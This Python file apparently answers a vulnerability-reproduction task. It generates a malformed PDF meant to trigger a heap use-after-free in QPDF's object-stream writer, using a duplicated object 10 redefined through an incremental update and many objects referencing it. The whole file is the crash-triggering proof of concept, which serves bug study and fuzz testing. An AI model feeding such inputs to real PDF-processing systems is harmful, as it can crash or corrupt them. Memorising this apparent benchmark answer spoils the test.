import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap-use-after-free in QPDF.

        The vulnerability (oss-fuzz:42535152) is in QPDFWriter::preserveObjectStreams,
        where QPDF::getCompressibleObjSet can prematurely delete an object from the cache
        if multiple definitions for the same object ID exist.

        This PoC constructs a PDF that triggers this condition by:
        1. Defining an initial version of an object (ID 10).
        2. Creating an incremental update that redefines object 10 as an object stream.
           This creates the "multiple entries for the same object id".
        3. Including numerous other small objects that reference object 10. When QPDF
           rewrites the file, QPDF::getCompressibleObjSet processes these small objects
           and must resolve the reference to object 10. This resolution, in the presence
           of two definitions for object 10, triggers a cache error leading to a UAF.
        """
        pdf = io.BytesIO()

        # PDF Header
        pdf.write(b"%PDF-1.7\n%\xa1\xb2\xc3\xd4\n")

        # --- Part 1: Initial document version ---
        offsets = {}

        # Object 1: Catalog
        offsets[1] = pdf.tell()
        pdf.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # Object 2: Pages
        offsets[2] = pdf.tell()
        pdf.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

        # Object 3: Page
        offsets[3] = pdf.tell()
        pdf.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n")

        # Object 10: The object that will be redefined. This is the first definition.
        offsets[10] = pdf.tell()
        pdf.write(b"10 0 obj\n<</Original true>>\nendobj\n")

        # Create many small objects that reference object 10. These act as
        # candidates for compression into a new object stream by the writer,
        # forcing it to resolve the duplicated object 10.
        max_obj_num = 150
        for i in range(20, max_obj_num):
            offsets[i] = pdf.tell()
            pdf.write(f"{i} 0 obj\n<</Ref 10 0 R>>\nendobj\n".encode())

        # Xref table for the first part
        xref1_offset = pdf.tell()
        
        xref_entries = {0: (0, 65535, 'f')}
        for obj_num, offset in sorted(offsets.items()):
            xref_entries[obj_num] = (offset, 0, 'n')
        
        pdf.write(b"xref\n")
        sorted_nums = sorted(xref_entries.keys())
        
        i = 0
        while i < len(sorted_nums):
            start_num = sorted_nums[i]
            j = i
            while j + 1 < len(sorted_nums) and sorted_nums[j+1] == sorted_nums[j] + 1:
                j += 1
            count = j - i + 1
            pdf.write(f"{start_num} {count}\n".encode())
            for k in range(count):
                num = start_num + k
                offset, gen, status = xref_entries[num]
                pdf.write(f"{offset:010d} {gen:05d} {status} \n".encode())
            i = j + 1

        # Trailer for the first part
        pdf.write(b"trailer\n")
        pdf.write(b"<<\n")
        pdf.write(f"/Size {max_obj_num}\n".encode())
        pdf.write(b"/Root 1 0 R\n")
        pdf.write(b">>\n")
        pdf.write(b"startxref\n")
        pdf.write(f"{xref1_offset}\n".encode())
        pdf.write(b"%%EOF\n")

        # --- Part 2: Incremental Update ---
        
        # Redefine object 10 as an object stream. This is the second definition.
        update_offset_10 = pdf.tell()
        
        obj_stream_header = b"12 0\n"
        obj_stream_data = b"<</InStream true>>"
        stream_content = obj_stream_header + obj_stream_data

        obj_stream_dict = (
            b"<< /Type /ObjStm /N 1 /First %d /Length %d >>" %
            (len(obj_stream_header), len(stream_content))
        )

        pdf.write(b"10 0 obj\n")
        pdf.write(obj_stream_dict)
        pdf.write(b"\nstream\n")
        pdf.write(stream_content)
        pdf.write(b"\nendstream\nendobj\n")
        
        # Xref for the update section (only contains the changed object 10)
        xref2_offset = pdf.tell()
        pdf.write(b"xref\n")
        pdf.write(b"10 1\n")
        pdf.write(f"{update_offset_10:010d} 00000 n \n".encode())
        
        # Trailer for the update
        pdf.write(b"trailer\n")
        pdf.write(b"<<\n")
        pdf.write(f"/Size {max_obj_num}\n".encode())
        pdf.write(b"/Root 1 0 R\n")
        pdf.write(f"/Prev {xref1_offset}\n".encode())
        pdf.write(b">>\n")
        pdf.write(b"startxref\n")
        pdf.write(f"{xref2_offset}\n".encode())
        pdf.write(b"%%EOF\n")
        
        return pdf.getvalue()